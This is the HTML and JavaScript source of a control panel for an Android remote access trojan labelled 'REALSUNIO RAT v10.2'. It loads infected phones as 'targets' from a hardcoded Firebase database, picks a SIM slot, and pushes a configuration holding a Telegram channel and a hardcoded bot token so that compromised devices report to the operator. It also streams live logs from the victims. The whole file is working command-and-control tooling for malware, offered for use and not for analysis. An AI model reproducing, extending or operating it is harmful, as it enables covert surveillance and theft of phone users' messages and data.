<!DOCTYPE html>
<html>
<head>
    <title>REALSUNIO RAT CONTROL PANEL</title>
    <style>
        :root { --accent: #ff003c; --bg: #0a0a0a; --card: #161616; --text: #e0e0e0; }
        body { font-family: 'Consolas', monospace; background: var(--bg); color: var(--text); padding: 20px; }
        .rat-container { max-width: 800px; margin: auto; border: 1px solid #333; padding: 25px; border-radius: 5px; box-shadow: 0 0 20px rgba(255,0,60,0.1); }
        h1 { color: var(--accent); text-align: center; font-size: 22px; text-transform: uppercase; letter-spacing: 3px; border-bottom: 1px solid #333; padding-bottom: 10px; }
        
        .section { margin-bottom: 25px; border: 1px solid #222; padding: 15px; position: relative; }
        .section-label { position: absolute; top: -10px; left: 15px; background: var(--bg); padding: 0 10px; font-size: 12px; color: var(--accent); }
        
        select, input { width: 100%; background: #000; border: 1px solid #444; color: #00ff00; padding: 12px; margin: 10px 0; outline: none; box-sizing: border-box; }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        
        button { width: 100%; padding: 15px; cursor: pointer; border: 1px solid var(--accent); background: transparent; color: var(--accent); font-weight: bold; transition: 0.3s; text-transform: uppercase; }
        button:hover { background: var(--accent); color: #fff; box-shadow: 0 0 15px var(--accent); }
        
        #terminal { background: #000; height: 200px; overflow-y: auto; border: 1px solid #333; padding: 15px; font-size: 12px; line-height: 1.6; }
        .log-success { color: #00ff00; }
        .log-error { color: #ff0000; }
        .log-info { color: #00ccff; }
        .status-bar { font-size: 11px; color: #666; margin-top: 5px; text-align: right; }
    </style>
</head>
<body>

    <div class="rat-container">
        <h1>@REALSUNIO_RAT_v10.2</h1>

        <div class="section">
            <span class="section-label">TARGET_CONFIGURATION</span>
            <label>CHANNEL_ID</label>
            <input type="text" id="cid" placeholder="Ex: -10023456789">
        </div>

        <div class="grid">
            <div class="section">
                <span class="section-label">REMOTE_DEVICES</span>
                <select id="deviceList">
                    <option value="">SCANNING FOR TARGETS...</option>
                </select>
                <button onclick="fetchDevices()" style="padding:5px; font-size:10px; margin-top:5px;">REFRESH_LIST</button>
            </div>
            <div class="section">
                <span class="section-label">HARDWARE_SLOT</span>
                <select id="simSlot">
                    <option value="1">SIM_SLOT_01</option>
                    <option value="2">SIM_SLOT_02</option>
                </select>
            </div>
        </div>

        <button onclick="injectConfig()">INJECT_CONFIG_TO_ENGINE</button>

        <div class="section" style="margin-top:20px;">
            <span class="section-label">LIVE_REMOTE_LOGS</span>
            <div id="terminal">System Initializing... Ready for Input.</div>
            <div class="status-bar" id="engineStatus">ENGINE_OFFLINE</div>
        </div>
    </div>

    <script>
        const DB_URL = "https://xooejtvks-default-rtdb.firebaseio.com";

        // Deep Scan Device Logic
        async function fetchDevices() {
            const select = document.getElementById('deviceList');
            try {
                const response = await fetch(`${DB_URL}/devices.json`);
                const data = await response.json();
                
                select.innerHTML = '';
                
                if (!data) {
                    select.innerHTML = '<option value="">NO_DEVICES_FOUND</option>';
                    return;
                }

                // Handling both Object and Array structures
                Object.keys(data).forEach(key => {
                    let dev = data[key];
                    let model = dev.model || dev.deviceName || "Generic_Android";
                    let option = document.createElement('option');
                    option.value = key; // Device ID
                    option.innerHTML = `[+] ${model} (${key})`;
                    select.appendChild(option);
                });
                
                logToTerm("Device Scan Complete. Targets Found.", "success");
            } catch (e) {
                logToTerm("Connection Error during scan.", "error");
            }
        }

        function injectConfig() {
            let cid = document.getElementById('cid').value;
            let dev = document.getElementById('deviceList').value;
            let sim = document.getElementById('simSlot').value;

            if(!dev) { logToTerm("ERROR: Select a Target Device first!", "error"); return; }

            let payload = {
                channelId: cid,
                active_device: dev,
                active_sim_slot: sim,
                tgToken: "7978593529:AAFeC7_9nMxb9qVmWHGg4KJ63GPzjVQvIQo"
            };

            fetch(`${DB_URL}/app_config.json`, {
                method: 'PATCH',
                body: JSON.stringify(payload)
            }).then(() => {
                logToTerm(`Injected Config to ${dev} successfully.`, "info");
                document.getElementById('engineStatus').innerHTML = "ENGINE_ACTIVE | TARGET: " + dev;
            });
        }

        function logToTerm(msg, type) {
            let term = document.getElementById('terminal');
            let time = new Date().toLocaleTimeString();
            term.innerHTML = `<div class="log-${type}">[${time}] ${msg}</div>` + term.innerHTML;
        }

        // Live Log Stream
        setInterval(() => {
            fetch(`${DB_URL}/last_log.json`)
            .then(res => res.json())
            .then(data => {
                if(data && !document.getElementById('terminal').innerHTML.includes(data.msg)) {
                    logToTerm(data.msg, data.type);
                }
            });
        }, 3000);

        // Initial Load
        fetchDevices();
    </script>
</body>
</html>
